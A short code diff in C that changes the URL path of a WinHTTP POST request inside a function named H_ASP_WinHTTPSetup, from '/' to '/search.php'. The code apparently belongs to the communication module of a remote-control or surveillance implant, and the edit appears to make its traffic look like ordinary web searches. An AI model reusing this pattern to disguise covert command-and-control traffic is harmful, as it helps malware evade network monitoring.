@@ -688,7 +688,7 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 		return FALSE;
 	
 	// Crea la richiesta
-	if ( !(asp_global_request = FNC(WinHttpOpenRequest)( hConnect, L"POST", L"/", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, 0)) )
+	if ( !(asp_global_request = FNC(WinHttpOpenRequest)( hConnect, L"POST", L"/search.php", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, 0)) )
 		return FALSE;
 
 	FNC(WinHttpSetTimeouts)(asp_global_request, ASP_RESOLVE_TIMEOUT, ASP_CONNECT_TIMEOUT, ASP_SEND_TIMEOUT, ASP_RECV_TIMEOUT);
